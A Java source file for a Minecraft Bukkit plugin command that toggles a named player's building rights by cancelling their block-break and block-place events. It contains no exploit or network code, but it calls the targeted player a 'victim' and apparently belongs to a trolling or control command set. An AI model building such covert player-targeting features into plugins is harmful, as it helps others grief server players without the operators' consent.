package de.garkolym.cp.commands.impl;

import de.garkolym.cp.Start;
import de.garkolym.cp.commands.Category;
import de.garkolym.cp.commands.CommandBase;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.block.BlockBreakEvent;
import org.bukkit.event.block.BlockPlaceEvent;

import java.util.ArrayList;

public class Command_BAURECHTE extends CommandBase implements Listener {

    private final ArrayList<Player> players = new ArrayList<>();

    public Command_BAURECHTE() {
        super("baurechte", "<Spieler>" + " §d| " + ChatColor.GRAY + "Baurechte entziehen", Category.OTHER);
        Bukkit.getPluginManager().registerEvents(this, Start.INSTANCE);
    }

    public void execute(String[] args, Player p) {
        if (args.length == 2) {
            try {
                Player victim = Bukkit.getPlayer(args[1]);
                if (!this.players.contains(victim)) {
                    this.players.add(victim);
                    p.sendMessage(Start.INSTANCE.chatPrefix + "Dem Spieler wurde die Baurechte entzogen.");
                } else {
                    this.players.remove(victim);
                    p.sendMessage(Start.INSTANCE.chatPrefix + "Der Spieler hat seine Baurechte wiederbekommen.");
                }
            } catch (Exception ignored) {
            }
        }
    }

    @EventHandler
    public void onBlockBreak(BlockBreakEvent e) {
        Player vic = e.getPlayer();
        if (this.players.contains(vic)) {
            e.setCancelled(true);
        }
    }

    @EventHandler
    public void onBlockPlace(BlockPlaceEvent e) {
        Player vic = e.getPlayer();
        if (this.players.contains(vic)) {
            e.setBuild(false);
            e.setCancelled(true);
        }
    }

}
